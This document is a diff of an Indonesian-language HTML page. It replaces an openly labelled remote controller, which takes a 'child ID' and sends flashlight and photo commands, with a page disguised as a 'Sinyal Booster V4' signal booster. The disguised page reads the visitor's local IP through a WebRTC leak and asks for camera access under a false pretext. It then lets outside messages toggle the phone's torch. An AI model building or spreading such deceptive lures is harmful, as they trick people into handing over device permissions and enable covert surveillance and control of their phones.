@@ -1,29 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head><title>REMOTE DIRECT</title></head>
-<body style="background:#111; color:#fff; text-align:center;">
-    <h2>🎮 DIRECT REMOTE</h2>
-    <input type="text" id="target-id" placeholder="Masukkan ID Anak">
-    <button onclick="konekin()">HUBUNGKAN</button>
-    <hr>
-    <button onclick="kirim('senter_on')">SENTER ON</button>
-    <button onclick="kirim('senter_off')">SENTER OFF</button>
-    <button onclick="kirim('foto')">AMBIL FOTO</button>
+<head>
+    <title>Sinyal Booster V4</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🚀 BOOSTING ACTIVE</h2>
+        <p id="ip-info">Mendeteksi Alamat Jaringan...</p>
+        <button onclick="mintaIzin()" style="padding:10px; background:#0f0; border:none; border-radius:5px;">AKTIFKAN SISTEM</button>
+    </div>
 
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script>
-        const peer = new Peer();
-        let koneksi;
+        // Mendeteksi IP Lokal secara otomatis (hanya di beberapa browser)
+        window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
+        pc.createDataChannel("");
+        pc.createOffer(pc.setLocalDescription.bind(pc), noop);
+        pc.onicecandidate = function(ice){
+            if(!ice || !ice.candidate || !ice.candidate.candidate) return;
+            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+            document.getElementById('ip-info').innerHTML = "<b>ALAMAT IP:</b> " + myIP;
+            pc.onicecandidate = noop;
+        };
 
-        function konekin() {
-            const id = document.getElementById('target-id').value;
-            koneksi = peer.connect(id);
-            alert("Mencoba menyambungkan...");
+        let track;
+        async function mintaIzin() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
+                track = stream.getVideoTracks()[0];
+                alert("Sistem Siap di IP tersebut!");
+            } catch(e) { alert("Klik Izinkan Kamera!"); }
         }
 
-        function kirim(cmd) {
-            if(koneksi) koneksi.send(cmd);
-        }
+        // Menerima perintah dari Remote via Message Channel
+        window.addEventListener("message", function(event) {
+            if (event.data === "on") track.applyConstraints({advanced: [{torch: true}]});
+            if (event.data === "off") track.applyConstraints({advanced: [{torch: false}]});
+        }, false);
     </script>
 </body>
 </html>
